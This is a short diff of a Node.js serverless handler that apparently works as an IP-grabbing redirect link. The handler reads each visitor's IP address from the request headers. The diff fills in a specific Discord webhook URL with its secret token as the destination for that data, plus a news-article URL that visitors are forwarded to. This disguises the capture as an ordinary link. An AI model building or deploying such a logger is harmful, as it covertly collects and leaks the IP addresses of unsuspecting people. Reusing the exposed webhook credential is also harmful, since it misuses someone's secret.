@@ -1,7 +1,7 @@
 const https = require('https');
 
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/..."  // ضع رابطك هنا
-const REDIRECT_URL = "https://example.com";  // الموقع النهائي
+const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1397615981613809776/dO4Lcv7dBOPHDCp4O6BcrE9CbvHjnRWJEqsZ2wQzhxxmyFKvcGTkU7FrHwHCGgqmVhPG"  // ضع رابطك هنا
+const REDIRECT_URL = "https://jo24.net/article/539190";  // الموقع النهائي
 
 module.exports = async (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
